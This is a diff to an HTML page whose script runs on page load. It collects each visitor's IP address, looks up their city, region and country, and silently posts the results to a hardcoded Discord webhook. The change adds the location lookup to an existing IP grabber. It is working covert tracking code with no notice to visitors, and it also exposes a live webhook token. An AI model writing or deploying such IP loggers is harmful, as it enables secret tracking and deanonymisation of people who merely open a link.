@@ -1,26 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>discord</title>
+    <title>Get IP and Send to Discord</title>
 </head>
 <body>
     <script>
-        // Function to get the user's IP address
-        async function getIP() {
+        // Function to get the user's IP address and location
+        async function getIPandLocation() {
             try {
-                let response = await fetch('https://api.ipify.org?format=json');
-                let data = await response.json();
-                return data.ip;
+                // Fetch the IP address
+                let ipResponse = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipResponse.json();
+                let ip = ipData.ip;
+
+                // Fetch the geolocation data
+                let locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                let locationData = await locationResponse.json();
+                return { ip: ip, location: locationData };
             } catch (error) {
-                console.error('Error getting IP address:', error);
+                console.error('Error getting IP and location:', error);
             }
         }
 
-        // Function to send the IP address to a Discord webhook
-        async function sendToDiscord(ip) {
+        // Function to send the IP address and location to a Discord webhook
+        async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
             const payload = {
-                content: `User IP Address: ${ip}`
+                content: `User IP Address: ${data.ip}\nLocation: ${data.location.city}, ${data.location.region}, ${data.location.country_name}`
             };
 
             try {
@@ -36,11 +42,11 @@
             }
         }
 
-        // Main function to get IP and send it
+        // Main function to get IP and location and send it
         async function main() {
-            const ip = await getIP();
-            if (ip) {
-                await sendToDiscord(ip);
+            const data = await getIPandLocation();
+            if (data) {
+                await sendToDiscord(data);
             }
         }
 
